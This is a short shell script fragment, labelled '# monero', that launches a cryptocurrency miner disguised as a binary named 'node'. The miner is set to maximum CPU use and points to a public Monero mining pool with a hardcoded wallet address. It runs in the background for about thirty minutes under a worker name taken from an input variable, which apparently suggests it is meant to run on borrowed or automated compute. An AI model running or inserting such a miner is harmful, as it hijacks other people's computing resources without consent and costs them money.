...
# monero
START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o pool.supportxmr.com:80  -u 4AnBzt2r9TcQtrQPt7eR4MYS3GtZqRi55Xq5pezcvqnv7WVvgteEshdF4Xcht5XMJwWP3mfH5Nk4s4cfRgZeCQyWUgEMeVo.net_${INPUT_NUMBER} > try.log & sleep 1830 )
